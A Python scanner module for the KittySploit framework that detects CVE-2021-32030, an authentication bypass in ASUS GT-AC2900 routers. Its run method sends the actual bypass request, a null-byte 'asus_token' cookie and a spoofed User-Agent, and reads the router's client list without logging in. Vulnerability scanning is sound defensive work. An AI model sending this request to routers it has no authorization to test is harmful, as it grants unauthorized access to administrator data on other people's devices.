#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ASUS GT-AC2900 devices before 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ASUS GT-AC2900 - Authentication Bypass Detection',
        'description': "ASUS GT-AC2900 devices before 3.0.0.4.386.42643 allows authentication bypass when processing remote input from an unauthenticated user, leading to unauthorized access to the administrator application. This relates to handle_request in router/httpd/httpd.c and auth_check in web_hook.o. An attacker-supplied value of '\x00' matches the device's default value of '\x00' in some situations.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'asus', 'auth-bypass', 'router', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.atredis.com/blog/2021/4/30/asus-authentication-bypass',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-32030',
            'https://github.com/atredispartners/advisories/blob/master/ATREDIS-2020-0010.md',
            'https://www.asus.com/Networking-IoT-Servers/WiFi-Routers/ASUS-Gaming-Routers/RT-AC2900/HelpDesk_BIOS/',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-32030',
    }

    def run(self):
        path = '/appGet.cgi?hook=get_cfg_clientlist()'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'User-Agent': 'asusrouter--', 'Referer': '{{BaseURL}}', 'Cookie': 'asus_token=\\0Invalid; clickedItem_tab=0'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('get_cfg_clientlist', 'alias', 'model_name',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='ASUS GT-AC2900 - Authentication Bypass detected', path=path)
            return True
        return False

